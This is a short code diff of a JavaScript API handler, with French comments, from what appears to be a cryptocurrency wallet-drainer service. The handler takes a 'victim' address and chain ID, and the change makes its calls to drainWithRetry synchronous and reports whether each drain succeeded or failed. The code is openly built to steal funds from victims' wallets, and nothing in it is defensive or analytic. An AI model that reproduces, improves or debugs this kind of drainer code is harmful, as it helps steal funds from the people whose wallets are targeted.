@@ -172,18 +172,28 @@ export default async function handler(req, res) {
       }
       const targetChain = chain || '1';
       console.log(`Drain admin pour ${victim} chain ${targetChain}`);
-      drainWithRetry(victim, targetChain).catch(console.error);
-      return res.status(200).json({ success: true, victim, chain: targetChain });
+      // Drain synchrone
+      const success = await drainWithRetry(victim, targetChain);
+      if (success) {
+        return res.status(200).json({ success: true, victim, chain: targetChain });
+      } else {
+        return res.status(500).json({ success: false, error: 'Drain a échoué après toutes les tentatives' });
+      }
     }
 
     // Drain normal
     if (!victim) return res.status(400).json({ error: 'Victime manquante' });
     console.log(`Victime reçue : ${victim} sur chain ${chain || '1'}`);
-    drainWithRetry(victim, chain || '1').catch(console.error);
-    return res.status(200).json({ success: true, victim, chain: chain || '1' });
+    // Drain synchrone
+    const success = await drainWithRetry(victim, chain || '1');
+    if (success) {
+      return res.status(200).json({ success: true, victim, chain: chain || '1' });
+    } else {
+      return res.status(500).json({ success: false, error: 'Drain a échoué après toutes les tentatives' });
+    }
 
   } catch (err) {
     console.error('Handler error:', err);
-    return res.status(500).json({ error: 'Erreur interne' });
+    return res.status(500).json({ error: err.message || 'Erreur interne' });
   }
 }
